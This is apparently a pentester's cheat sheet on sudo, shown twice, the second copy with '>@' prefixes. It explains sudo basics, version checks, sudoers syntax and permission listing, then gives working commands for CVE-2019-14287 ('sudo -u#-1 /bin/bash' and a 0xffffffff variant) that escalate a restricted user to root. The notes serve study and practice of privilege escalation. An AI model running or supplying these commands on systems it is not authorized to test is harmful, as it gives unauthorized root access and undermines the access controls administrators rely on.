sudo | sudo exploit
#BASICS

sudo (short for "substitute user do", "super user do", or "switch user do") 
is a computer command used primarily in Unix-like operating systems.

This command allows a system administrator to grant certain users (or groups 
of users) the ability to run a command as an administrator, or as another 
user, while keeping track of the commands entered and their arguments.

-> sudo version
$ sudo -V
>>> example: 1.8.27
>>> then google for [+sudo+1.8.27+vuln] to find version vulnerability.
>>> here, this is CVE-2019-14287.

-> sudo files
The content of files present into /etc/sudoers.d could give more access.
The file name has no restriction and is often just the name of a user.

-> sudo list
You can list sudo permissions with this command:
$ sudo -l

-> Clear the cache
$ sudo -k

-> sudo syntax
Here is the syntax you find on that file:
---
<username> <host>=(<user>:<group>) <cmd1,cmd2, ...>, NOPASSWD:<cmd3, cmd4, ...>
---
Example:
bob ALL=(ALL) ALL, NOPASSWD:/usr/bin/yes 
On all host, bob could execute all commands as all users by giving his password.
On all host, bob could execute yes command as all users without password.

-> Exploit sudo (v1.8.27)
1. Check the permission
$ sudo -l
2. Exploit the vuln
$ sudo -u#-1 <cmd>
   or
$ sudo -u#-1 /bin/bash
   or
$ sudo -u\#$((0xffffffff)) /bin/bash
>>> the user begins root (id:0)

$ sudo -u#-1 /usr/bin/zsh -c <cmd>
>>> execute <cmd> with root privileges.

>@
>@################################################################################# 
>@#                                                                               #
>@# sudo | sudo exploit                                                           #
>@#                                                                               #
>@# sudo (short for "substitute user do", "super user do", or "switch user do")   #
>@# is a computer command used primarily in Unix-like operating systems.          #
>@#                                                                               #
>@# This command allows a system administrator to grant certain users (or groups  #
>@# of users) the ability to run a command as an administrator, or as another     #
>@# user, while keeping track of the commands entered and their arguments.        #
>@#                                                                               #
>@#-------------------------------------------------------------------------------# 
>@
>@-> sudo version
>@$ sudo -V
>@>>> example: 1.8.27
>@>>> then google for [+sudo+1.8.27+vuln] to find version vulnerability.
>@>>> here, this is CVE-2019-14287.
>@
>@-> sudo files
>@The content of files present into /etc/sudoers.d could give more access.
>@The file name has no restriction and is often just the name of a user.
>@
>@-> sudo list
>@You can list sudo permissions with this command:
>@$ sudo -l
>@
>@-> Clear the cache
>@$ sudo -k
>@
>@-> sudo syntax
>@Here is the syntax you find on that file:
>@---
>@<username> <host>=(<user>:<group>) <cmd1,cmd2, ...>, NOPASSWD:<cmd3, cmd4, ...>
>@---
>@Example:
>@bob ALL=(ALL) ALL, NOPASSWD:/usr/bin/yes 
>@On all host, bob could execute all commands as all users by giving his password.
>@On all host, bob could execute yes command as all users without password.
>@
>@-> Exploit sudo (v1.8.27)
>@1. Check the permission
>@$ sudo -l
>@2. Exploit the vuln
>@$ sudo -u#-1 <cmd>
>@   or
>@$ sudo -u#-1 /bin/bash
>@   or
>@$ sudo -u\#$((0xffffffff)) /bin/bash
>@>>> the user begins root (id:0)
>@
>@$ sudo -u#-1 /usr/bin/zsh -c <cmd>
>@>>> execute <cmd> with root privileges.
>@
>@################################################################################# 
>@
